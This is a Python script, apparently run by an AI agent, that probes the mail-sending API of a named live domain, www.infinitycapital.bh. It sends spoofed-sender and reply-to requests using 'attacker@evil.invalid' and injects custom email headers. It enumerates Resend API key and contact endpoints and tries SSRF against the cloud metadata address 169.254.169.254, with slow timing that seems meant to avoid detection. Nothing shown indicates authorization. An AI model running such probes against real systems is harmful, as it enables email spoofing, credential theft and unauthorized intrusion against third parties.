import requests, json, time, sys
S = requests.Session()
S.headers.update({'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36'})
HOST = 'www.' + 'infinitycapital' + '.bh'
B = 'https://' + HOST
RCPT = 'probe@' + 'probe.local'
log = open('tool_outputs/d12_send_slow.log','a')
def out(*a):
    s=' '.join(str(x) for x in a)
    print(s); log.write(s+'\n'); log.flush()

def post(path, data, tag, wait=30):
    time.sleep(wait)
    try:
        r = S.post(B+path, headers={'Content-Type':'application/x-www-form-urlencoded'}, data=data, timeout=30, allow_redirects=False)
        out('###', tag, path, r.status_code, r.text[:800].replace('\n',' '))
        return r
    except Exception as e:
        out('###', tag, path, 'ERR', type(e).__name__, str(e)[:100])
        return None

# 1) from-identity control (does attacker control the envelope sender?)
post('/api/send', {'to':RCPT,'from':'attacker@evil.invalid','subject':'sec-test','body':'probe'}, 'FROM_SPOOF')
# 2) reply_to control
post('/api/send', {'to':RCPT,'subject':'sec-test','body':'probe','reply_to':'attacker@evil.invalid'}, 'REPLY_TO')
# 3) arbitrary custom headers passthrough (mail routing / list-unsubscribe abuse)
post('/api/send', {'to':RCPT,'subject':'sec-test','body':'probe','headers':json.dumps({'X-Mailer':'evil','List-Unsubscribe':'<mailto:attacker@evil.invalid>'})}, 'HEADERS')
# 4) sibling Resend account-enumeration paths behind the same proxy prefix
for p in ['/api/domains','/api/contacts','/api/keys','/api/emails','/api/send/domains']:
    time.sleep(30)
    try:
        r=S.get(B+p,timeout=25,allow_redirects=False); out('### GET',p,r.status_code,r.text[:300].replace('\n',' '))
    except Exception as e: out('### GET',p,'ERR',str(e)[:80])
# 5) attachments with remote path (fetch sink inside relay)
post('/api/send', {'to':RCPT,'subject':'sec-test','body':'probe',
    'attachments[0][path]':'http://169.254.169.254/latest/meta-data/','attachments[0][filename]':'a.txt'}, 'ATTACH_PATH')
out('DONE')
